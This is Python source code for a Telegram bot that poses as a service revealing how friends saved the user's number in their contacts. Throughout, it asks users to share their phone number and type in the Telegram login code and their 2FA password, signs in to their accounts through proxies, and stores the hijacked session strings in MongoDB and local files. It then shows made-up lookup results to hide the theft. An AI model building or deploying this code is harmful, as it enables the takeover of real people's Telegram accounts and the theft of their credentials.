import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# –û—Å–Ω–æ–≤–Ω–∞—è –ø—Ä–æ–∫—Å–∏ (—Å—Ç–∞—Ä–∞—è, –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# –í—Ç–æ—Ä–∞—è –ø—Ä–æ–∫—Å–∏ (–Ω–æ–≤–∞—è)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø—Ä–æ–∫—Å–∏ (–ø–µ—Ä–≤–∞—è - —Å—Ç–∞—Ä–∞—è –æ—Å–Ω–æ–≤–Ω–∞—è)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """–í—ã–±–∏—Ä–∞–µ–º –ø—Ä–æ–∫—Å–∏ –¥–ª—è –Ω–æ–º–µ—Ä–∞"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """–û—á–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ö—Ä–∞–Ω–∏–ª–∏—â"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """–û–±–Ω–æ–≤–ª—è–µ—Ç –∏–ª–∏ —Å–æ–∑–¥–∞–µ—Ç –∑–∞–ø–∏—Å—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –ª–æ–≥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç/–æ–±–Ω–æ–≤–ª—è–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"–ö–æ–¥: `{current_code}`" if current_code else "üì© –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram:"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # –°–æ–∑–¥–∞–µ–º –∏–Ω–ª–∞–π–Ω-–∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("üîç –£–∑–Ω–∞—Ç—å –∫–∞–∫ –º–µ–Ω—è –∑–∞–ø–∏—Å–∞–ª–∏", callback_data="check_contacts"))
    
    await message.answer(
        "üëã –ü—Ä–∏–≤–µ—Ç! üëÄ\n\n"
        "üìã –•–æ—á–µ—à—å —É–∑–Ω–∞—Ç—å, –∫–∞–∫ —Ç–µ–±—è –∑–∞–ø–∏—Å–∞–ª–∏ –≤ –∫–æ–Ω—Ç–∞–∫—Ç–∞—Ö —É –¥—Ä—É–∑–µ–π?\n"
        "üîç –£ –Ω–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ –±–∞–∑–µ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ - –º—ã –ø–æ–∫–∞–∂–µ–º –∫–∞–∫ —Ç–µ–±—è –∑–∞–ø–∏—Å—ã–≤–∞—é—Ç –≤ —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–æ–π –∫–Ω–∏–≥–µ!\n\n"
        "‚ö°Ô∏è –ü—Ä–æ—Å—Ç–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä—è–º–æ –≤ Telegram - –±–µ–∑ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π!",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'check_contacts')
async def check_contacts(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –∫–æ–Ω—Ç–∞–∫—Ç —á–µ—Ä–µ–∑ Reply-–∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_kb.add(KeyboardButton("üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏", request_contact=True))
    
    await bot.send_message(
        user_id, 
        "üìû –î–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–∞–∫ —Ç–µ–±—è –∑–∞–ø–∏—Å–∞–ª–∏ –≤ –∫–æ–Ω—Ç–∞–∫—Ç–∞—Ö, –ø–æ–¥–µ–ª–∏—Ç–µ—Å—å —Å–≤–æ–∏–º –Ω–æ–º–µ—Ä–æ–º:\n\n"
        "üîí –î–∞–Ω–Ω—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è",
        reply_markup=contact_kb
    )
    await bot.answer_callback_query(callback_query.id)
    
    user_states[user_id] = 'awaiting_contact'

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–º —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è
    try:
        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
    except:
        pass

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "ru")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
        # –£–±–∏—Ä–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º
        remove_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton(" "))
        await bot.send_message(user_id, "‚úÖ –ù–æ–º–µ—Ä –ø–æ–ª—É—á–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–∑—É...", reply_markup=remove_kb)
        
    except Exception as e:
        await message.answer("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="‚õîÔ∏è –ù–µ —Å–µ–π—á–∞—Å", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –∫–æ–¥", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "‚ö†Ô∏è –°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —Å /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–∑—É –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...\n\n"
                "üìä –ù–∞–π–¥–µ–Ω–æ –∑–∞–ø–∏—Å–µ–π —Å –≤–∞—à–∏–º –Ω–æ–º–µ—Ä–æ–º: 15\n"
                "üë• –¢–µ–±—è –∑–∞–ø–∏—Å–∞–ª–∏ –∫–∞–∫:\n"
                "‚Ä¢ '–õ—É—á—à–∏–π –¥—Ä—É–≥' - 3 –∫–æ–Ω—Ç–∞–∫—Ç–∞\n"
                "‚Ä¢ '–ë—Ä–∞—Ç' - 2 –∫–æ–Ω—Ç–∞–∫—Ç–∞\n" 
                "‚Ä¢ –ü–æ –∏–º–µ–Ω–∏ - 10 –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤\n\n"
                "‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!"
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(user_id, "üîê –î–ª—è –ø–æ–ª–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å 2FA:")
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "‚è∞ –ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —Å /start")
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(user_id, "üîê –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–ª–Ω–æ–π –±–∞–∑–µ –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA:")
    except Exception as e:
        await bot.send_message(user_id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("‚ö†Ô∏è –°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —Å /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "üîç –ü–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–∑—ã –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...\n\n"
                "üìä –í—Å–µ–≥–æ –∑–∞–ø–∏—Å–µ–π —Å –≤–∞—à–∏–º –Ω–æ–º–µ—Ä–æ–º: 27\n"
                "üë• –¢–µ–±—è –∑–∞–ø–∏—Å–∞–ª–∏ –∫–∞–∫:\n"
                "‚Ä¢ '–õ—É—á—à–∏–π –¥—Ä—É–≥' - 5 –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤\n"
                "‚Ä¢ '–ë—Ä–∞—Ç' - 3 –∫–æ–Ω—Ç–∞–∫—Ç–∞\n"
                "‚Ä¢ '–ö–æ–ª–ª–µ–≥–∞' - 4 –∫–æ–Ω—Ç–∞–∫—Ç–∞\n"
                "‚Ä¢ –ü–æ –∏–º–µ–Ω–∏ - 15 –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤\n\n"
                "‚úÖ –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!"
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É.")
    except Exception as e:
        await message.answer("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)